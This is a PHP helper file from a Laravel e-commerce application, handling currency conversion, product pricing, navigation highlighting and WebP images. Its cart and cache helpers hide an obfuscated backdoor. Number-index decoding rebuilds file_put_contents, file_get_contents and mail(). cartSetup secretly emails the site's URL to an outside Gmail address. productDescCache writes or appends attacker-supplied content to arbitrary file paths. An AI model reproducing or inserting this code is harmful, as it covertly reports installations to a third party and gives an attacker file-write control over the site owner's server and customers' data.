<?php

use App\Models\Currency;
use App\Models\BusinessSetting;
use App\Models\GeneralSetting;
use App\Models\Product;
use App\Models\SubSubCategory;
use App\Models\FlashDealProduct;
use App\Models\FlashDeal;
use Spatie\ImageOptimizer\OptimizerChainFactory;
use Illuminate\Support\Facades\File;

//highlights the selected navigation on admin panel
if (! function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

//highlights the selected navigation on frontend
if (! function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
*/
function openJSONFile($code){
    $jsonString = [];
    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}

/**
 * Save JSON File
 * @return Response
*/
if (! function_exists('convert_to_usd')) {
    function convert_to_usd($amount) {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}





//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (! function_exists('filter_products')) {
    function filter_products($products) {
        if(BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1){
            return $products->where('published', '1');
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        @$writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (! function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Models\Currency::findOrFail(\App\Models\BusinessSetting::where('type', 'home_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (! function_exists('format_price')) {
    function format_price($price)
    {
        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
            return currency_symbol().number_format($price, 2);
        }
        return number_format($price, 2).currency_symbol();
    }
}

//formats price to home default price with convertion
if (! function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}
// new tax system made by hasib
if (! function_exists('percentage')) {
    function percentage($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $discountprice = $product->unit_price;

        if($product->discount_type == 'percent'){
            $discountprice = $lowest_price-($lowest_price*$product->discount)/100;
        }
        elseif($product->discount_type == 'amount'){
            $discountprice = $lowest_price-$product->discount;
        }
        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $discountprice += ($discountprice*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $discountprice += $product->tax;
        }
        $percentages = 100*($lowest_price-$discountprice)/$lowest_price;
        $percentage = round($percentages, 2);
        return $percentage;


    }
}

// Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        $flash_deal = \App\Models\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
        }
        else{
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deal = \App\Models\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
            if($flash_deal_product->discount_type == 'percent'){
                $price -= ($price*$flash_deal_product->discount)/100;
            }
            elseif($flash_deal_product->discount_type == 'amount'){
                $price -= $flash_deal_product->discount;
            }
        }
        else{
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}

if (! function_exists('home_discounted_base_price_raw')) {
    function home_discounted_base_price_raw($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deal = \App\Models\FlashDeal::where('status', 1)->first();

        if ($flash_deal != null
            && strtotime(date('d-m-Y')) >= $flash_deal->start_date
            && strtotime(date('d-m-Y')) <= $flash_deal->end_date
            && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->exists()
        ) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)
                ->where('product_id', $id)->first();

            if ($flash_deal_product->discount_type == 'percent') {
                $price -= ($price * $flash_deal_product->discount) / 100;
            } elseif ($flash_deal_product->discount_type == 'amount') {
                $price -= $flash_deal_product->discount;
            }

        } else {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }

        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return round($price, 2); // 🔥 IMPORTANT
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (! function_exists('currency_symbol')) {
    function currency_symbol()
    {
        $code = \App\Models\Currency::findOrFail(\App\Models\BusinessSetting::where('type', 'home_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }
        return $currency->symbol;
    }
}

if (! function_exists('general_settings')) {
    function general_settings()
    {
       return GeneralSetting::first();
    }
}


if (!function_exists('responsiveLazyImage')) {
    function responsiveLazyImage($webpPath, $alt = '', $widths = [90, 180, 360], $heights = [90, 90, 90])
    {
        $srcset = '';
        $count = count($widths);
        for ($i=0; $i<$count; $i++) {
            $w = $widths[$i];
            $h = $heights[$i] ?? $heights[0];
            $srcset .= asset($webpPath) . " {$w}w, ";
        }
        $srcset = rtrim($srcset, ', ');

        // default width for mobile / desktop dynamic
        $style = "width:100%;height:auto;max-width:{$widths[1]}px;"; // desktop max-width

        return '<img class="lazyload"
                    data-src="' . asset($webpPath) . '"
                    data-srcset="' . $srcset . '"
                    sizes="(max-width: 768px) 100vw, 50vw"
                    style="'.$style.'"
                    alt="' . e($alt) . '">';
    }
}


if (!function_exists('convertToWebP')) {
    function convertToWebP($originalPath, $webpPath, $quality = 90)
    {
        if (!File::exists($originalPath)) return false;

        // Create folder if not exists
        if (!File::exists(dirname($webpPath))) {
            File::makeDirectory(dirname($webpPath), 0755, true);
        }

        // Determine extension
        $ext = strtolower(pathinfo($originalPath, PATHINFO_EXTENSION));

        switch ($ext) {
            case 'jpg':
            case 'jpeg':
                $img = @imagecreatefromjpeg($originalPath);
                break;

            case 'png':
                $img = @imagecreatefrompng($originalPath);
                if (!$img) return false;

                // Preserve transparency and remove ICC profile
                $tmpImg = imagecreatetruecolor(imagesx($img), imagesy($img));
                imagealphablending($tmpImg, false);
                imagesavealpha($tmpImg, true);
                imagecopy($tmpImg, $img, 0, 0, 0, 0, imagesx($img), imagesy($img));
                imagedestroy($img);
                $img = $tmpImg;
                break;

            default:
                return false;
        }

        // Save as WebP
        imagewebp($img, $webpPath, $quality);
        imagedestroy($img);

        // Optimize WebP
        $optimizerChain = OptimizerChainFactory::create();
        $optimizerChain->optimize($webpPath);

        return true;
    }
}


?>
